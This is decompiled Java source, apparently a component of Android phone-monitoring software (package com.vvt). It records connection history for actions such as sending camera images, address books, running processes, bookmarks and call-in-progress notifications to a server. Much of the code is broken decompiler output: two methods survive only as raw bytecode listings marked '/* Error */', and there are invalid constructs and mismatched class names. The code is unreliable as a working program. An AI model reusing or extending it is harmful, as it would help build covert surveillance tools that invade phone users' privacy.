package com.vvt.connectionhistorymanager;

import com.vvt.io.p;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Iterator;
import java.util.LinkedList;

public class c
{
  private static final boolean a = d.a;
  private static final boolean b = d.b;
  private static final boolean c = d.e;
  private static final boolean d = d.d;
  private String e;
  
  public c(String paramString)
  {
    this.e = paramString;
  }
  
  private static String a(int paramInt)
  {
    String str;
    switch (paramInt)
    {
    case 12: 
    case 13: 
    case 14: 
    case 15: 
    case 22: 
    default: 
      str = "Unknown action";
    }
    for (;;)
    {
      return str;
      str = "Send event";
      continue;
      str = "Send activate";
      continue;
      str = "Send deactivate";
      continue;
      str = "Send heartbeat";
      continue;
      str = "Get configuration";
      continue;
      str = "Get CSID";
      continue;
      str = "Send clear csid";
      continue;
      str = "Get activation code";
      continue;
      str = "Get address book";
      continue;
      str = "Send address book for approval";
      continue;
      str = "Send address book";
      continue;
      str = "Get communication directives";
      continue;
      str = "Get time";
      continue;
      str = "Send message";
      continue;
      str = "Get process white list";
      continue;
      str = "Send running process";
      continue;
      str = "Get process black list";
      continue;
      str = "Get Incompatible Application Definitions";
      continue;
      str = "Send call in progress notification";
      continue;
      str = "Send installed applications";
      continue;
      str = "Send camera image";
      continue;
      str = "Send running application";
      continue;
      str = "Send application profile";
      continue;
      str = "Send bookmarks";
      continue;
      str = "Send URL profile";
      continue;
      str = "Get application profile";
      continue;
      str = "Get url profile";
      continue;
      str = "Get Activation Code For Account";
      continue;
      str = "Send Application Instance Identifier";
      continue;
      str = "Get Bookmarks";
    }
  }
  
  /* Error */
  private void a(LinkedList paramLinkedList)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: aload_0
    //   3: invokespecial 98	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:FxFileObserverWorker	()Ljava/io/File;
    //   6: astore_3
    //   7: new 100	java/io/FileOutputStream
    //   10: astore 4
    //   12: aload 4
    //   14: aload_3
    //   15: invokespecial 103	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   18: new 105	java/io/BufferedOutputStream
    //   21: astore 5
    //   23: aload 5
    //   25: aload 4
    //   27: invokespecial 108	java/io/BufferedOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   30: new 110	java/io/ObjectOutputStream
    //   33: astore_3
    //   34: aload_3
    //   35: aload 5
    //   37: invokespecial 111	java/io/ObjectOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   40: aload_3
    //   41: aload_1
    //   42: invokevirtual 115	java/io/ObjectOutputStream:writeObject	(Ljava/lang/Object;)V
    //   45: aload_3
    //   46: invokestatic 120	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   49: aload 5
    //   51: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   54: aload 4
    //   56: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   59: return
    //   60: astore_3
    //   61: aconst_null
    //   62: astore_3
    //   63: aconst_null
    //   64: astore 5
    //   66: getstatic 23	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   69: istore 6
    //   71: iload 6
    //   73: ifeq +3 -> 76
    //   76: aload_3
    //   77: invokestatic 120	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   80: aload_2
    //   81: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   84: aload 5
    //   86: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   89: goto -30 -> 59
    //   92: astore_3
    //   93: aconst_null
    //   94: astore 5
    //   96: iconst_0
    //   97: istore 6
    //   99: aconst_null
    //   100: astore 4
    //   102: aload_2
    //   103: invokestatic 120	com/vvt/io/d:a	(Ljava/io/ObjectOutputStream;)V
    //   106: aload 5
    //   108: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   111: aload 4
    //   113: invokestatic 122	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   116: aload_3
    //   117: athrow
    //   118: astore_3
    //   119: aconst_null
    //   120: astore 5
    //   122: goto -20 -> 102
    //   125: astore_3
    //   126: goto -24 -> 102
    //   129: astore 7
    //   131: aload_3
    //   132: astore_2
    //   133: aload 7
    //   135: astore_3
    //   136: goto -34 -> 102
    //   139: astore 7
    //   141: aload 5
    //   143: astore 4
    //   145: aload_2
    //   146: astore 5
    //   148: aload_3
    //   149: astore_2
    //   150: aload 7
    //   152: astore_3
    //   153: goto -51 -> 102
    //   156: astore_3
    //   157: aconst_null
    //   158: astore_3
    //   159: aload 4
    //   161: astore 5
    //   163: goto -97 -> 66
    //   166: astore_3
    //   167: aconst_null
    //   168: astore_3
    //   169: aload 5
    //   171: astore_2
    //   172: aload 4
    //   174: astore 5
    //   176: goto -110 -> 66
    //   179: astore_2
    //   180: aload 5
    //   182: astore_2
    //   183: aload 4
    //   185: astore 5
    //   187: goto -121 -> 66
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	190	0	this	MyUncaughtExceptionHandler
    //   0	190	1	paramLinkedList	LinkedList
    //   1	171	2	localObject1	Object
    //   179	1	2	localIOException1	java.io.IOException
    //   182	1	2	localObject2	Object
    //   6	40	3	localObject3	Object
    //   60	1	3	localIOException2	java.io.IOException
    //   62	15	3	localObjectOutputStream	java.io.ObjectOutputStream
    //   92	25	3	localObject4	Object
    //   118	1	3	localObject5	Object
    //   125	7	3	localObject6	Object
    //   135	18	3	localObject7	Object
    //   156	1	3	localIOException3	java.io.IOException
    //   158	1	3	localObject8	Object
    //   166	1	3	localIOException4	java.io.IOException
    //   168	1	3	localObject9	Object
    //   10	174	4	localObject10	Object
    //   21	165	5	localObject11	Object
    //   69	29	6	bool	boolean
    //   129	5	7	localObject12	Object
    //   139	12	7	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   2	6	60	java/io/IOException
    //   7	10	60	java/io/IOException
    //   14	18	60	java/io/IOException
    //   2	6	92	finally
    //   7	10	92	finally
    //   14	18	92	finally
    //   18	21	118	finally
    //   25	30	118	finally
    //   30	33	125	finally
    //   35	40	125	finally
    //   41	45	129	finally
    //   66	69	139	finally
    //   18	21	156	java/io/IOException
    //   25	30	156	java/io/IOException
    //   30	33	166	java/io/IOException
    //   35	40	166	java/io/IOException
    //   41	45	179	java/io/IOException
  }
  
  /* Error */
  private LinkedList f()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: new 126	java/util/LinkedList
    //   5: astore_2
    //   6: aload_2
    //   7: invokespecial 127	java/util/LinkedList:<init>	()V
    //   10: aload_0
    //   11: invokespecial 98	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:FxFileObserverWorker	()Ljava/io/File;
    //   14: astore_3
    //   15: aload_3
    //   16: invokevirtual 133	java/io/File:exists	()Z
    //   19: istore 4
    //   21: iload 4
    //   23: ifeq +74 -> 97
    //   26: new 135	java/io/FileInputStream
    //   29: astore 5
    //   31: aload 5
    //   33: aload_3
    //   34: invokespecial 136	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   37: new 138	java/io/BufferedInputStream
    //   40: astore 6
    //   42: aload 6
    //   44: aload 5
    //   46: invokespecial 141	java/io/BufferedInputStream:<init>	(Ljava/io/InputStream;)V
    //   49: new 143	java/io/ObjectInputStream
    //   52: astore_3
    //   53: aload_3
    //   54: aload 6
    //   56: invokespecial 144	java/io/ObjectInputStream:<init>	(Ljava/io/InputStream;)V
    //   59: aload_3
    //   60: invokeinterface 150 1 0
    //   65: astore_1
    //   66: aload_1
    //   67: checkcast 126	java/util/LinkedList
    //   70: astore_1
    //   71: getstatic 16	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:a	Z
    //   74: istore 7
    //   76: iload 7
    //   78: ifeq +3 -> 81
    //   81: aload_3
    //   82: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   85: aload 6
    //   87: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   90: aload 5
    //   92: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   95: aload_1
    //   96: areturn
    //   97: getstatic 26	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:d	Z
    //   100: istore 8
    //   102: iload 8
    //   104: ifeq +3 -> 107
    //   107: iconst_0
    //   108: istore 8
    //   110: aconst_null
    //   111: astore_3
    //   112: iconst_0
    //   113: istore 4
    //   115: aconst_null
    //   116: astore 6
    //   118: iconst_0
    //   119: istore 9
    //   121: aconst_null
    //   122: astore 5
    //   124: aload_2
    //   125: astore_1
    //   126: goto -45 -> 81
    //   129: astore_3
    //   130: iconst_0
    //   131: istore 8
    //   133: aconst_null
    //   134: astore_3
    //   135: iconst_0
    //   136: istore 4
    //   138: aconst_null
    //   139: astore 6
    //   141: aload_2
    //   142: astore 10
    //   144: iconst_0
    //   145: istore 7
    //   147: aconst_null
    //   148: astore_2
    //   149: aload 10
    //   151: astore_1
    //   152: getstatic 23	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   155: istore 9
    //   157: iload 9
    //   159: ifeq +3 -> 162
    //   162: aload_3
    //   163: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   166: aload 6
    //   168: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   171: aload_2
    //   172: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   175: goto -80 -> 95
    //   178: astore_3
    //   179: iconst_0
    //   180: istore 8
    //   182: aconst_null
    //   183: astore_3
    //   184: iconst_0
    //   185: istore 4
    //   187: aconst_null
    //   188: astore 6
    //   190: iconst_0
    //   191: istore 9
    //   193: aconst_null
    //   194: astore 5
    //   196: aload_2
    //   197: astore_1
    //   198: getstatic 23	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   201: istore 7
    //   203: iload 7
    //   205: ifeq +3 -> 208
    //   208: aload_3
    //   209: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   212: aload 6
    //   214: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   217: goto -127 -> 90
    //   220: astore_3
    //   221: iconst_0
    //   222: istore 8
    //   224: aconst_null
    //   225: astore_3
    //   226: iconst_0
    //   227: istore 4
    //   229: aconst_null
    //   230: astore 6
    //   232: iconst_0
    //   233: istore 9
    //   235: aconst_null
    //   236: astore 5
    //   238: aload_2
    //   239: astore_1
    //   240: getstatic 23	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   243: istore 7
    //   245: iload 7
    //   247: ifeq +3 -> 250
    //   250: aload_3
    //   251: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   254: aload 6
    //   256: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   259: goto -169 -> 90
    //   262: astore_3
    //   263: iconst_0
    //   264: istore 8
    //   266: aconst_null
    //   267: astore_3
    //   268: iconst_0
    //   269: istore 4
    //   271: aconst_null
    //   272: astore 6
    //   274: iconst_0
    //   275: istore 9
    //   277: aconst_null
    //   278: astore 5
    //   280: aload_2
    //   281: astore_1
    //   282: getstatic 23	com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   285: istore 7
    //   287: iload 7
    //   289: ifeq +3 -> 292
    //   292: aload_3
    //   293: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   296: aload 6
    //   298: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   301: goto -211 -> 90
    //   304: astore_3
    //   305: iconst_0
    //   306: istore 4
    //   308: aconst_null
    //   309: astore 6
    //   311: iconst_0
    //   312: istore 9
    //   314: aconst_null
    //   315: astore 5
    //   317: aload_3
    //   318: astore 10
    //   320: iconst_0
    //   321: istore 8
    //   323: aconst_null
    //   324: astore_3
    //   325: aload 10
    //   327: astore_1
    //   328: aload_3
    //   329: invokestatic 153	com/vvt/io/d:a	(Ljava/io/ObjectInput;)V
    //   332: aload 6
    //   334: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   337: aload 5
    //   339: invokestatic 155	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   342: aload_1
    //   343: athrow
    //   344: astore_3
    //   345: iconst_0
    //   346: istore 4
    //   348: aconst_null
    //   349: astore 6
    //   351: aconst_null
    //   352: astore 10
    //   354: aload_3
    //   355: astore_1
    //   356: iconst_0
    //   357: istore 8
    //   359: aconst_null
    //   360: astore_3
    //   361: goto -33 -> 328
    //   364: astore 10
    //   366: iconst_0
    //   367: istore 8
    //   369: aconst_null
    //   370: astore_3
    //   371: aload 10
    //   373: astore_1
    //   374: goto -46 -> 328
    //   377: astore_1
    //   378: goto -50 -> 328
    //   381: astore_1
    //   382: aload_2
    //   383: astore 5
    //   385: goto -57 -> 328
    //   388: astore_3
    //   389: iconst_0
    //   390: istore 8
    //   392: aconst_null
    //   393: astore_3
    //   394: iconst_0
    //   395: istore 4
    //   397: aconst_null
    //   398: astore 6
    //   400: aload_2
    //   401: astore_1
    //   402: goto -120 -> 282
    //   405: astore_3
    //   406: iconst_0
    //   407: istore 8
    //   409: aconst_null
    //   410: astore_3
    //   411: aload_2
    //   412: astore_1
    //   413: goto -131 -> 282
    //   416: astore_1
    //   417: aload_2
    //   418: astore_1
    //   419: goto -137 -> 282
    //   422: astore_2
    //   423: goto -141 -> 282
    //   426: astore_3
    //   427: iconst_0
    //   428: istore 8
    //   430: aconst_null
    //   431: astore_3
    //   432: iconst_0
    //   433: istore 4
    //   435: aconst_null
    //   436: astore 6
    //   438: aload_2
    //   439: astore_1
    //   440: goto -200 -> 240
    //   443: astore_3
    //   444: iconst_0
    //   445: istore 8
    //   447: aconst_null
    //   448: astore_3
    //   449: aload_2
    //   450: astore_1
    //   451: goto -211 -> 240
    //   454: astore_1
    //   455: aload_2
    //   456: astore_1
    //   457: goto -217 -> 240
    //   460: astore_2
    //   461: goto -221 -> 240
    //   464: astore_3
    //   465: iconst_0
    //   466: istore 8
    //   468: aconst_null
    //   469: astore_3
    //   470: iconst_0
    //   471: istore 4
    //   473: aconst_null
    //   474: astore 6
    //   476: aload_2
    //   477: astore_1
    //   478: goto -280 -> 198
    //   481: astore_3
    //   482: iconst_0
    //   483: istore 8
    //   485: aconst_null
    //   486: astore_3
    //   487: aload_2
    //   488: astore_1
    //   489: goto -291 -> 198
    //   492: astore_1
    //   493: aload_2
    //   494: astore_1
    //   495: goto -297 -> 198
    //   498: astore_2
    //   499: goto -301 -> 198
    //   502: astore_3
    //   503: iconst_0
    //   504: istore 8
    //   506: aconst_null
    //   507: astore_3
    //   508: iconst_0
    //   509: istore 4
    //   511: aconst_null
    //   512: astore 6
    //   514: aload_2
    //   515: astore_1
    //   516: aload 5
    //   518: astore_2
    //   519: goto -367 -> 152
    //   522: astore_3
    //   523: iconst_0
    //   524: istore 8
    //   526: aconst_null
    //   527: astore_3
    //   528: aload_2
    //   529: astore_1
    //   530: aload 5
    //   532: astore_2
    //   533: goto -381 -> 152
    //   536: astore_1
    //   537: aload_2
    //   538: astore_1
    //   539: aload 5
    //   541: astore_2
    //   542: goto -390 -> 152
    //   545: astore_2
    //   546: aload 5
    //   548: astore_2
    //   549: goto -397 -> 152
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	552	0	this	MyUncaughtExceptionHandler
    //   1	373	1	localObject1	Object
    //   377	1	1	localObject2	Object
    //   381	1	1	localObject3	Object
    //   401	12	1	localObject4	Object
    //   416	1	1	localClassNotFoundException1	ClassNotFoundException
    //   418	33	1	localObject5	Object
    //   454	1	1	localIOException1	java.io.IOException
    //   456	33	1	localObject6	Object
    //   492	1	1	localStreamCorruptedException1	java.io.StreamCorruptedException
    //   494	36	1	localObject7	Object
    //   536	1	1	localFileNotFoundException1	java.io.FileNotFoundException
    //   538	1	1	localObject8	Object
    //   5	413	2	localLinkedList	LinkedList
    //   422	34	2	localClassNotFoundException2	ClassNotFoundException
    //   460	34	2	localIOException2	java.io.IOException
    //   498	17	2	localStreamCorruptedException2	java.io.StreamCorruptedException
    //   518	24	2	localObject9	Object
    //   545	1	2	localFileNotFoundException2	java.io.FileNotFoundException
    //   548	1	2	localObject10	Object
    //   14	98	3	localObject11	Object
    //   129	1	3	localFileNotFoundException3	java.io.FileNotFoundException
    //   134	29	3	localObjectInput1	java.io.ObjectInput
    //   178	1	3	localStreamCorruptedException3	java.io.StreamCorruptedException
    //   183	26	3	localObjectInput2	java.io.ObjectInput
    //   220	1	3	localIOException3	java.io.IOException
    //   225	26	3	localObjectInput3	java.io.ObjectInput
    //   262	1	3	localClassNotFoundException3	ClassNotFoundException
    //   267	26	3	localObjectInput4	java.io.ObjectInput
    //   304	14	3	localObject12	Object
    //   324	5	3	localObjectInput5	java.io.ObjectInput
    //   344	11	3	localObject13	Object
    //   360	11	3	localObject14	Object
    //   388	1	3	localClassNotFoundException4	ClassNotFoundException
    //   393	1	3	localObject15	Object
    //   405	1	3	localClassNotFoundException5	ClassNotFoundException
    //   410	1	3	localObject16	Object
    //   426	1	3	localIOException4	java.io.IOException
    //   431	1	3	localObject17	Object
    //   443	1	3	localIOException5	java.io.IOException
    //   448	1	3	localObject18	Object
    //   464	1	3	localStreamCorruptedException4	java.io.StreamCorruptedException
    //   469	1	3	localObject19	Object
    //   481	1	3	localStreamCorruptedException5	java.io.StreamCorruptedException
    //   486	1	3	localObject20	Object
    //   502	1	3	localFileNotFoundException4	java.io.FileNotFoundException
    //   507	1	3	localObject21	Object
    //   522	1	3	localFileNotFoundException5	java.io.FileNotFoundException
    //   527	1	3	localObject22	Object
    //   19	491	4	bool1	boolean
    //   29	518	5	localObject23	Object
    //   40	473	6	localBufferedInputStream	java.io.BufferedInputStream
    //   74	214	7	bool2	boolean
    //   100	425	8	bool3	boolean
    //   119	194	9	bool4	boolean
    //   142	211	10	localObject24	Object
    //   364	8	10	localObject25	Object
    // Exception table:
    //   from	to	target	type
    //   15	19	129	java/io/FileNotFoundException
    //   26	29	129	java/io/FileNotFoundException
    //   33	37	129	java/io/FileNotFoundException
    //   97	100	129	java/io/FileNotFoundException
    //   15	19	178	java/io/StreamCorruptedException
    //   26	29	178	java/io/StreamCorruptedException
    //   33	37	178	java/io/StreamCorruptedException
    //   97	100	178	java/io/StreamCorruptedException
    //   15	19	220	java/io/IOException
    //   26	29	220	java/io/IOException
    //   33	37	220	java/io/IOException
    //   97	100	220	java/io/IOException
    //   15	19	262	java/lang/ClassNotFoundException
    //   26	29	262	java/lang/ClassNotFoundException
    //   33	37	262	java/lang/ClassNotFoundException
    //   97	100	262	java/lang/ClassNotFoundException
    //   15	19	304	finally
    //   26	29	304	finally
    //   33	37	304	finally
    //   97	100	304	finally
    //   37	40	344	finally
    //   44	49	344	finally
    //   49	52	364	finally
    //   54	59	364	finally
    //   59	65	377	finally
    //   66	70	377	finally
    //   71	74	377	finally
    //   198	201	377	finally
    //   240	243	377	finally
    //   282	285	377	finally
    //   152	155	381	finally
    //   37	40	388	java/lang/ClassNotFoundException
    //   44	49	388	java/lang/ClassNotFoundException
    //   49	52	405	java/lang/ClassNotFoundException
    //   54	59	405	java/lang/ClassNotFoundException
    //   59	65	416	java/lang/ClassNotFoundException
    //   66	70	416	java/lang/ClassNotFoundException
    //   71	74	422	java/lang/ClassNotFoundException
    //   37	40	426	java/io/IOException
    //   44	49	426	java/io/IOException
    //   49	52	443	java/io/IOException
    //   54	59	443	java/io/IOException
    //   59	65	454	java/io/IOException
    //   66	70	454	java/io/IOException
    //   71	74	460	java/io/IOException
    //   37	40	464	java/io/StreamCorruptedException
    //   44	49	464	java/io/StreamCorruptedException
    //   49	52	481	java/io/StreamCorruptedException
    //   54	59	481	java/io/StreamCorruptedException
    //   59	65	492	java/io/StreamCorruptedException
    //   66	70	492	java/io/StreamCorruptedException
    //   71	74	498	java/io/StreamCorruptedException
    //   37	40	502	java/io/FileNotFoundException
    //   44	49	502	java/io/FileNotFoundException
    //   49	52	522	java/io/FileNotFoundException
    //   54	59	522	java/io/FileNotFoundException
    //   59	65	536	java/io/FileNotFoundException
    //   66	70	536	java/io/FileNotFoundException
    //   71	74	545	java/io/FileNotFoundException
  }
  
  private File g()
  {
    File localFile = new java/io/File;
    String str = p.a(this.e, "connection_history.dat");
    localFile.<init>(str);
    return localFile;
  }
  
  public LinkedList a()
  {
    return f();
  }
  
  public void a(ConnectionHistoryEntry paramConnectionHistoryEntry)
  {
    LinkedList localLinkedList = a();
    localLinkedList.addFirst(paramConnectionHistoryEntry);
    a(localLinkedList);
  }
  
  public int b()
  {
    return f().size();
  }
  
  public String c()
  {
    Object localObject1 = a();
    boolean bool = a;
    if (bool) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    int i = ((LinkedList)localObject1).size();
    if (i == 0)
    {
      localObject1 = localStringBuilder.append("No Data Available");
      String str = "\n";
      ((StringBuilder)localObject1).append(str);
    }
    int j;
    Iterator localIterator;
    do
    {
      j = a;
      if (j != 0) {}
      return localStringBuilder.toString();
      localIterator = ((LinkedList)localObject1).iterator();
      j = 1;
      i = j;
      j = localIterator.hasNext();
    } while (j == 0);
    localObject1 = (ConnectionHistoryEntry)localIterator.next();
    int m = localStringBuilder.length();
    if (m != 0)
    {
      localObject2 = localStringBuilder.append("\n");
      localObject3 = "\n";
      ((StringBuilder)localObject2).append((String)localObject3);
    }
    localStringBuilder.append("No: ").append(i).append("\n");
    Object localObject2 = localStringBuilder.append("Action: ");
    int n = ((ConnectionHistoryEntry)localObject1).getAction();
    Object localObject3 = a(n);
    ((StringBuilder)localObject2).append((String)localObject3).append("\n");
    localStringBuilder.append("Connection Type: ");
    localObject2 = ((ConnectionHistoryEntry)localObject1).getConnectionType();
    localObject3 = ConnectionType.GPRS;
    if (localObject2 == localObject3)
    {
      localObject2 = localStringBuilder.append("GPRS");
      localObject3 = "\n";
      ((StringBuilder)localObject2).append((String)localObject3);
      label226:
      localStringBuilder.append("Status: ");
      localObject2 = ((ConnectionHistoryEntry)localObject1).getStatus();
      localObject3 = Status.SUCCESS;
      if (localObject2 != localObject3) {
        break label425;
      }
      localObject2 = localStringBuilder.append("Operation success");
      localObject3 = "\n";
      ((StringBuilder)localObject2).append((String)localObject3);
    }
    for (;;)
    {
      localStringBuilder.append("APN: ");
      localObject2 = ((ConnectionHistoryEntry)localObject1).getAPN();
      localStringBuilder.append((String)localObject2).append("\n");
      localStringBuilder.append("Date: ");
      localObject2 = new java/text/SimpleDateFormat;
      localObject3 = "dd/MM/yyyy HH:mm:ss";
      ((SimpleDateFormat)localObject2).<init>((String)localObject3);
      long l = ((ConnectionHistoryEntry)localObject1).getDate();
      localObject1 = Long.valueOf(l);
      localObject1 = ((SimpleDateFormat)localObject2).format(localObject1);
      localStringBuilder.append((String)localObject1);
      int k = i + 1;
      i = k;
      break;
      localObject2 = ((ConnectionHistoryEntry)localObject1).getConnectionType();
      localObject3 = ConnectionType.WIFI;
      if (localObject2 == localObject3)
      {
        localObject2 = localStringBuilder.append("Wireless LAN");
        localObject3 = "\n";
        ((StringBuilder)localObject2).append((String)localObject3);
        break label226;
      }
      localObject2 = localStringBuilder.append("UNKNOWN");
      localObject3 = "\n";
      ((StringBuilder)localObject2).append((String)localObject3);
      break label226;
      label425:
      localStringBuilder.append("Operation failed").append("\n");
      localStringBuilder.append("Message: ");
      localObject2 = ((ConnectionHistoryEntry)localObject1).getMessage();
      localObject2 = localStringBuilder.append((String)localObject2).append(" [");
      n = ((ConnectionHistoryEntry)localObject1).getStatusCode();
      localObject2 = ((StringBuilder)localObject2).append(n).append("]");
      localObject3 = "\n";
      ((StringBuilder)localObject2).append((String)localObject3);
    }
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    LinkedList localLinkedList = f();
    Object localObject = localLinkedList.getLast();
    localLinkedList.remove(localObject);
    a(localLinkedList);
    bool = a;
    if (bool) {}
  }
  
  public ConnectionHistoryEntry e()
  {
    Object localObject1 = f();
    try
    {
      localObject1 = ((LinkedList)localObject1).getFirst();
      localObject1 = (ConnectionHistoryEntry)localObject1;
    }
    finally
    {
      for (;;)
      {
        Object localObject3 = null;
      }
    }
    return (ConnectionHistoryEntry)localObject1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/connectionhistorymanager/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */